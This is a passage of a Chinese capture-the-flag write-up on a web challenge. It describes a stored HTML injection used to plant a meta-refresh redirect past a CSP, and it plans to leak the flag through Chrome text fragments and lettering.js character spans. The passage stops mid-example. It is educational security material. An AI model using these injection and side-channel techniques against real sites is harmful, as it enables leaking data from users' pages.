Activation</h3><p><strong>&#x8FD9;&#x90E8;&#x5206;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x7684;&#x7406;&#x89E3;&#x4E5F;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x6DF1;&#x523B;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x662F;&#x6BD4;&#x8F83;&#x7C97;&#x6D45;&#x7684;&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#xFF0C;&#x5982;&#x6709;&#x9519;&#x8BEF;&#xFF0C;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x76F4;&#x63A5;&#x6307;&#x51FA;&#x3002;</strong></p><p><strong>&#x672C;&#x90E8;&#x5206;&#x53C2;&#x8003;&#x4E3B;&#x8981;&#x662F;&#x4E24;&#x4E2A;&#x6587;&#x6863;&#xFF1A;<a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a>&#x3001;<a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a>&#xFF0C;&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x5BF9;&#x82F1;&#x6587;&#x9605;&#x8BFB;&#x7406;&#x89E3;&#x6BD4;&#x8F83;&#x597D;&#xFF0C;&#x66F4;&#x5EFA;&#x8BAE;&#x770B;&#x539F;&#x6587;</strong></p><p>&#x2018;User Activation&#x2019; &#x8FD9;&#x4E2A;&#x8BCD;&#x770B;&#x8D77;&#x6765;&#x6BD4;&#x8F83;&#x7684;&#x5173;&#x952E;&#xFF0C;&#x51FA;&#x73B0;&#x5728;&#x4E86;&#x4F5C;&#x8005;&#x7684;&#x89E3;&#x91CA;&#x4EE5;&#x53CA; hint &#x5F53;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x4F5C;&#x8005;&#x653E; hint &#x8981;&#x7279;&#x610F;&#x7ED9; &#x2018;User Activation&#x2019; &#x8FD9;&#x4E2A;&#x8BCD;&#x800C;&#x4E0D;&#x662F;&#x76F8;&#x5BF9;&#x4E8E;&#x66F4;&#x50CF;&#x901A;&#x4FD7;&#x7684; &#x2018;User Interaction&#x2019; &#x5462;&#xFF1F;</p><p>&#x968F;&#x4FBF;&#x641C;&#x4E00;&#x4E0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053; &#x2018;User Activation&#x2019; &#x5176;&#x5B9E;&#x7B97;&#x662F;&#x4E00;&#x4E2A;&#x672F;&#x8BED;&#xFF1A;</p><blockquote><p>&#x200B;    User activation is the mechanism to maintain active-user-interaction state that limits use of &#x201C;abusable&#x201D; APIs (e.g. opening popups or vibrating).</p></blockquote><p>&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;User Activation(&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x79F0;&#x4E3A;&#x201C;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x72B6;&#x6001;&#x201D;)&#xFF0C;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x7528;&#x6237;&#x4E3B;&#x52A8;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x9650;&#x5236;&#x4E86;&#x4E00;&#x4E9B;&#x88AB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x7684; API &#xFF0C;&#x6BD4;&#x5982;&#x5F39;&#x7A97;&#x6216;&#x8005;&#x9707;&#x52A8;&#x3002;&#x201D;&#x6FC0;&#x6D3B; &#x201C;&#x72B6;&#x6001;&#x901A;&#x5E38;&#x610F;&#x5473;&#x7740;&#x7528;&#x6237;&#x5F53;&#x524D;&#x901A;&#x8FC7;&#x67D0;&#x79CD;&#x8F93;&#x5165;&#x673A;&#x5236;&#xFF08;&#x6253;&#x5B57;&#x3001;&#x70B9;&#x51FB;&#x9F20;&#x6807;&#x7B49;&#xFF09;&#x4E0E;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#xFF0C;&#x6216;&#x8005;&#x7528;&#x6237;&#x5728;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x540E;&#x5B8C;&#x6210;&#x4E86;&#x67D0;&#x79CD;&#x4EA4;&#x4E92;&#x3002;</p><p>&#x6D4F;&#x89C8;&#x5668;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x8FD9;&#x79CD;&#x72B6;&#x6001;&#x6765;&#x63A7;&#x5236;&#x5BF9;&#x88AB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x7684; API &#x8BBF;&#x95EE;&#xFF0C;&#x8FD9;&#x79CD; API &#x6700;&#x660E;&#x663E;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x662F;&#x901A;&#x8FC7;<code>window.open()</code>&#x6253;&#x5F00;&#x5F39;&#x51FA;&#x7A97;&#x53E3;&#x3002;&#x5F53;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x6D41;&#x6C13;&#x5F00;&#x53D1;&#x8005;&#x5F00;&#x59CB;&#x6076;&#x610F;&#x4F7F;&#x7528;&#x8BE5; API &#x4EFB;&#x610F;&#x5F39;&#x7A97;&#x540E;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x6D4F;&#x89C8;&#x5668;&#x52A0;&#x5165;&#x4E86;&#x5728;&#x7528;&#x6237;&#x672A;&#x4E3B;&#x52A8;&#x4E0E;&#x9875;&#x9762;&#x4EA4;&#x4E92;&#x65F6;&#x963B;&#x6B62;&#x5F39;&#x7A97;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4ECE;&#x90A3;&#x65F6;&#x8D77;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x9010;&#x6E10;&#x4F7F;&#x8BB8;&#x591A;&#x5176;&#x4ED6; API &#x4F9D;&#x8D56;&#x4E8E;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#xFF08;&#x66F4;&#x51C6;&#x786E;&#x5730;&#x8BF4;&#xFF0C;&#x4F7F;&#x5B83;&#x4EEC;&#x53D7;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x63A7;&#x5236;&#xFF09;&#xFF0C;&#x6BD4;&#x5982;&#x5168;&#x5C4F;&#x3001;&#x9707;&#x52A8;&#xFF0C;&#x81EA;&#x52A8;&#x64AD;&#x653E;&#x5A92;&#x4F53;&#x7B49;&#xFF0C; Chrome &#x4E2D;&#x7EA6;&#x6709;30&#x79CD;&#x4E0D;&#x540C;&#x7684; API &#x7531;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x63A7;&#x5236;&#x3002;</p><h3 id="uBlock"><a href="#uBlock" class="headerlink" title="uBlock"></a>uBlock</h3><blockquote><p>uBlock Origin (or uBlock&#x2080;) is not an <em>ad blocker</em>; it&#x2019;s a general-purpose blocker. uBlock Origin blocks ads through its support of the <a href="https://adblockplus.org/en/filters" target="_blank" rel="noopener">Adblock Plus filter syntax</a>. uBlock Origin <a href="https://github.com/gorhill/uBlock/wiki/Filter-syntax-extensions" target="_blank" rel="noopener">extends</a> the syntax and is designed to work with custom rules and filters. Furthermore, advanced mode allows uBlock Origin to work in <a href="https://github.com/gorhill/uBlock/wiki/Dynamic-filtering:-default-deny" target="_blank" rel="noopener">default-deny mode</a>, which mode will cause <a href="https://requestpolicycontinued.github.io/#what-are-cross-site-requests" target="_blank" rel="noopener">all 3rd-party network requests</a> to be blocked by default, unless allowed by the user.</p></blockquote><p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;uBlock &#x662F;&#x4E00;&#x4E2A;&#x901A;&#x7528;&#x7684; blocker &#xFF0C;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x81EA;&#x5B9A;&#x4E49;&#x89C4;&#x5219;&#x6765;&#x914D;&#x5408;&#x8FC7;&#x6EE4;&#x9875;&#x9762;&#x5143;&#x7D20;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x53EF;&#x4EE5;&#x5230; <a href="https://github.com/gorhill/uBlock" target="_blank" rel="noopener">uBlock</a> &#x4ED3;&#x5E93;&#x67E5;&#x770B;&#x3002;</p><p><del>&#x4E2A;&#x4EBA;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x975E;&#x5E38;&#x7406;&#x89E3;&#x4F5C;&#x8005;&#x5728;&#x6B64;&#x5904;&#x5F15;&#x5165; uBlock &#x7684;&#x70B9;&#xFF0C;&#x4EE5;&#x53CA;&#x914D;&#x5408; User Activation &#x7684;&#x51FA;&#x9898;&#x610F;&#x56FE;&#xFF0C;&#x867D;&#x7136;&#x4F5C;&#x8005;&#x89E3;&#x91CA;&#x4E86;&#x4ED6;&#x7684;&#x51FA;&#x9898;&#x610F;&#x56FE;</del>&#xFF1A;</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.  Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again.    </p></blockquote><p>&#x5C31;&#x5728;&#x6211;&#x5199;&#x8FD9;&#x6BB5;&#x8BDD;&#x7684;&#x65F6;&#x5019;&#x6211;&#x5E61;&#x7136;&#x9192;&#x609F;&#xFF0C;&#x8FD9;&#x4E2A; uBlock &#x7684;&#x5F15;&#x5165;&#x5BF9;&#x4F20;&#x9012; User Activation &#x6781;&#x4E3A;&#x91CD;&#x8981;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD9;&#x4E48;&#x8BF4;&#x5462;&#xFF1F;&#x56E0;&#x4E3A;&#x5B83;&#x5BF9;&#x4E8E;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x91CC;&#x8981;&#x5F15;&#x5165;&#x7684;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#x6709;&#x7740;&#x5341;&#x5206;&#x91CD;&#x8981;&#x7684;&#x8054;&#x7CFB;&#xFF01;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6682;&#x4E14;&#x6211;&#x4EEC;&#x628A; uBlock + User Activation &#x7684;&#x6982;&#x5FF5;&#x4EE5;&#x53CA;&#x5229;&#x7528;&#x653E;&#x4E00;&#x653E;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x770B;&#x770B;&#x600E;&#x4E48;&#x83B7;&#x53D6; flag &#x3002;</p><h3 id="How-to-get-the-FLAG"><a href="#How-to-get-the-FLAG" class="headerlink" title="How to get the FLAG"></a>How to get the FLAG</h3><ol><li>&#x5B58;&#x5728; CSP &#x9650;&#x5236;</li><li>Admin &#x4F1A;&#x70B9;&#x51FB;&#x6211;&#x4EEC;&#x7684; issue &#x94FE;&#x63A5;</li><li>Flag &#x5728;&#x540C;&#x57DF;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#xFF1A;<a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">http://catalog.pwni.ng/issue.php?id=3</a></li></ol><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7531; 1) &#x77E5;&#x9053;&#xFF0C;&#x4E00;&#x4E9B;&#x5229;&#x7528; scirpt &#x7684;&#x8DF3;&#x8F6C;&#x5C31;&#x5931;&#x6548;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5982;&#x4E0B;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x9875;&#x9762;&#x8DF3;&#x8F6C;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://url/&apos;&quot;</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x662F;&#x4E24;&#x4E2A; HTML &#x6CE8;&#x5165;&#xFF0C;&#x800C;&#x4E14; image url &#x5904;&#x7684;&#x6CE8;&#x5165;&#x8FD8;&#x662F;&#x5B58;&#x50A8;&#x578B;&#x7684;&#x3002;</p><p>&#x5047;&#x8BBE;&#x5982;&#x679C;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x6267;&#x884C; script &#x4EE3;&#x7801;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E24;&#x4E2A; iframe &#xFF0C;&#x4E00;&#x4E2A; iframe &#x6307;&#x5411;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x7684; js &#x9875;&#x9762;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A; iframe &#x6307;&#x5411; flag &#x7684;&#x9875;&#x9762;&#xFF0C;&#x901A;&#x8FC7; js &#x6765;&#x83B7;&#x53D6;&#x540C;&#x57DF;&#x4E0B;&#x7684;&#x53E6;&#x4E00;&#x4E2A; iframe &#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x8FD9;&#x4E5F;&#x7B97;&#x662F;&#x5E38;&#x7528;&#x7684; csrf &#x7684;&#x4E00;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003; Byte Bandits CTF 2020 - Notes App &#x7684;&#x89E3;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#x4E86;&#x3002;</p><p>&#x5982;&#x679C;&#x80FD;&#x63D2;&#x5165; script &#x6267;&#x884C;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x53EF;&#x60DC;&#x63D2;&#x4E0D;&#x5F97;&#x3002;</p><h3 id="Text-Fragments"><a href="#Text-Fragments" class="headerlink" title="Text Fragments"></a>Text Fragments</h3><p>&#x53CD;&#x624B;&#x770B;&#x4E00;&#x624B; Chrome &#x65B0;&#x7279;&#x6027;&#xFF0C;&#x95F7;&#x58F0;&#x53D1;&#x5927;&#x8D22;&#x3002;</p><p>&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;CTF &#x51FA;&#x9898;&#x4EBA;&#x4F1A;&#x6709;&#x4E8B;&#x6CA1;&#x4E8B;&#x53BB;&#x770B;&#x770B; php &#x6E90;&#x7801; or chrome new features &#xFF0C;&#x6240;&#x4EE5;&#xFF1A;<a href="https://developers.google.com/web/updates/2020/02/nic80#more" target="_blank" rel="noopener">New in Chrome 80</a></p><blockquote><p>Of course, there&#x2019;s plenty more!</p><ul><li>You can now link directly to text fragments on a page, by using <code>#:~:text=something</code>. Chrome will scroll to and highlight the first instance of that text fragment. For example [<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York]</a>(<a href="https://en.wikipedia.org/wiki/Rickrolling#:~:text=New" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rickrolling#:~:text=New</a> York)</li></ul></blockquote><p>Scroll To Text Fragment: <a href="https://chromestatus.com/feature/4733392803332096" target="_blank" rel="noopener">https://chromestatus.com/feature/4733392803332096</a></p><blockquote><p>&#x200B;    This feature allows a user or author to link to a specific portion of a page, using a text snippet provided in the URL. When the page is loaded, the browser highlights the text and scrolls it into view.</p></blockquote><p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;Chrome &#x5728;&#x4ECA;&#x5E74;2&#x6708;&#x4EFD;&#x7684;&#x66F4;&#x65B0;&#x63A8;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7279;&#x6027;&#xFF0C;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x80FD;&#x8BA9;&#x6211;&#x4EEC;&#x7528;&#x5F62;&#x5982;<code>#:~:text=something</code>&#x7684;&#x6837;&#x5F0F;&#x6765;&#x6ED1;&#x52A8;&#x5230;&#x8BE5;&#x9875;&#x9762;<code>something</code>&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x9AD8;&#x4EAE;&#xFF0C;&#x8D4B;&#x4E88;&#x4E86;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x4F3C;&#x4E00;&#x4E2A; anchor &#x951A;&#x6807;&#x7B7E;&#x7684;&#x4F5C;&#x7528;&#x3002;</p><p>&#x5177;&#x4F53;&#x7684;&#x4F7F;&#x7528;&#x5E08;&#x5085;&#x4EEC;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6587;&#x6863; <a href="https://wicg.github.io/ScrollToTextFragment/" target="_blank" rel="noopener">Text Fragments</a> &#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x53EA;&#x62E9;&#x53D6;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x6765;&#x8BF4;&#xFF1A;</p><ul><li><p>&#x5339;&#x914D;&#x6A21;&#x5F0F;&#xFF1A;</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#:~:text=[prefix-,]textStart[,textEnd][,-suffix]</span></span><br><span class="line">          context  |<span class="hljs-string">-------match-----</span>|<span class="hljs-string">  context</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x524D;&#x7F00;&#x8DDF;&#x8DDF;&#x540E;&#x7F00;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x9650;&#x5236;&#x4E0A;&#x4E0B;&#x6587;&#xFF0C;&#x771F;&#x6B63;&#x5339;&#x914D;&#x7684;&#x8FD8;&#x662F;&#x4E2D;&#x95F4;&#x7684; textStart &amp; textEnd</p></li><li><p>&#x9700;&#x8981;&#x5B8C;&#x6574;&#x5339;&#x914D;&#x4E00;&#x4E2A;&#x5355;&#x8BCD;&#xFF0C;&#x65E0;&#x6CD5;&#x5339;&#x914D;&#x5355;&#x8BCD;&#x4E2D;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;&#x3002;</p><blockquote><p>Example 12</p><p>&#x201C;range&#x201D; will match in &#x201C;mountain range&#x201D; but not in &#x201C;color orange&#x201D; nor &#x201C;forest ranger&#x201D;.</p></blockquote></li><li><p>&#x5355;&#x8BCD;&#x9700;&#x8981;&#x5728;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x5757;&#x91CC;&#x9762;&#xFF1A;</p><blockquote><p>Example 11</p><p></p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">:~:text=The</span> quick,lazy dog</span><br></pre></td></tr></tbody></table></figure><p></p><p>will fail to match in</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>because the starting string &#x201C;The quick&#x201D; does not appear within a single, uninterrupted block. The instance of &#x201C;The quick&#x201D; in the document has a block element between &#x201C;The&#x201D; and &#x201C;quick&#x201D;.</p><p>It does, however, match in this example:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>The quick brown fox<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>jumped over the lazy dog<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></blockquote></li></ul><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6709;&#x4E2A;&#x60F3;&#x6CD5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x65B0;&#x7279;&#x6027;&#x53BB;&#x5339;&#x914D;&#x5230; flag &#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF1A;</p><ul><li>&#x5982;&#x679C; flag &#x662F; PCTF{TEST} &#xFF0C;&#x6211;&#x4EEC;&#x7528;<code>#:~:text=P-,C,T,-F</code>&#x662F;&#x5339;&#x914D;&#x4E0D;&#x5230;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4E0D;&#x80FD;&#x5339;&#x914D;&#x5230;&#x5355;&#x8BCD;&#x7684;&#x5355;&#x4E2A;&#x5B57;&#x6BCD;</li><li>&#x5373;&#x4F7F;&#x6211;&#x4EEC;&#x80FD;&#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x600E;&#x4E48;&#x6837;&#x5224;&#x65AD;&#x6211;&#x4EEC;&#x5339;&#x914D;&#x5230;&#x4E86;&#x5462;&#xFF1F;</li></ul><h3 id="Lettering"><a href="#Lettering" class="headerlink" title="Lettering"></a>Lettering</h3><p>&#x6309;&#x7167;&#x4E0A;&#x8FF0;&#x601D;&#x8DEF;&#xFF0C;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x5F97;&#x627E;&#x4E2A;&#x529E;&#x6CD5;&#x62C6;&#x5206;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5176;&#x5B9E;&#x51FA;&#x9898;&#x4EBA;&#x5DF2;&#x7ECF;&#x5F88;&#x8D34;&#x5FC3;&#x5730;&#x4E3A;&#x6211;&#x4EEC;&#x505A;&#x597D;&#x4E86;&#xFF1A;</p><p>&#x8FD9;&#x662F;&#x9875;&#x9762;&#x6240;&#x5F15;&#x5165;&#x7684;&#x6587;&#x4EF6;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.google.com/recaptcha/api.js?render=6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/main.js&quot;</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">&quot;Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;&#x5F15;&#x5165;&#x4E86; jquery.lettering.min.js &#xFF0C;&#x5E76;&#x4E14; main.js &#x6709;&#x5982;&#x4E0B;&#x4EE3;&#x7801;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="hljs-string">&quot;em&quot;</span>).lettering();</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728; lettering.js &#x7684;&#x6587;&#x6863;&#x4E2D;&#x770B;&#x5230; <a href="https://github.com/davatron5000/Lettering.js/wiki/Wrapping-letters-with-lettering()" target="_blank" rel="noopener">Lettering.js wiki - Wrapping letters with lettering()</a></p><blockquote><p>We&#x2019;ll start with some really basic markup:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fancy_title&quot;</span>&gt;</span>Some Title<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>After including jQuery, <a href="http://github.com/davatron5000/Lettering.js/downloads" target="_blank" rel="noopener">download and include the latest minified version of Lettering.js</a>, then a script block with the magical <code>.lettering()</code> method:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path/to/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path/to/jquery.lettering.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">$(<span class="hljs-built_in">document</span>).ready(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-javascript">  $(<span class="hljs-string">&quot;.fancy_title&quot;</span>).lettering();</span></span><br><span class="line">});</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>The resulting code will churn your <code>.fancy_title</code> and output the following:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fancy_title&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char1&quot;</span>&gt;</span>S<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char2&quot;</span>&gt;</span>o<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char3&quot;</span>&gt;</span>m<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char4&quot;</span>&gt;</span>e<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char5&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;char6&quot;</span>&gt;</span>T<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span 